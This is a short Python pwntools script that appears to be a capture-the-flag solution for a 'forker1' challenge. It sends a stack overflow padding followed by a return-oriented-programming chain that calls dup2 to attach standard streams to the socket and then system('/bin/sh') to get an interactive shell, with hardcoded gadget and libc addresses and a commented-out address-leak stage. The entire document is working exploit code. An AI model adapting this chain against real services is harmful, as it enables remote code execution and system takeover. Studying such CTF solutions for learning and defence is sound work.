#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'
#r = remote('127.0.0.1', 31337)
r = remote('forker1.wpictf.xyz', 31337)
print "pid: ",proc.pidof(r)

pop_rdi = 0x0000000000400c13
pop_rsi_r15 = 0x0000000000400c11
puts_got = 0x0602020
read_got = 0x602050
dprintf_plt = 0x400800
base = 0x7ffff79f5000 # 
sh = base + 1720096 # libc = ELF('./libc') ; next(libc.searhc('/bin/sh'))
system = 0x7ffff7a3cdc0
dup2 = base + 1067232
raw_input("#")

trash = "a"*76+p64(0x4d)+"a"*4 
#use to leak: pad1 = flat([pop_rdi, 4, pop_rsi_r15, read_got, 0, dprintf_plt])
pad2 = flat([pop_rdi, 4, pop_rsi_r15, 0, 0, dup2, pop_rdi, 4, pop_rsi_r15])
pad2 +=flat([1, 0, dup2, pop_rdi, sh, system])
r.sendline(trash + pad2)
"""
r.recvuntil("Password:")
addr = u64(r.recv(8).ljust(8, '\x00'))
print "addr: ",hex(addr)
"""
r.interactive()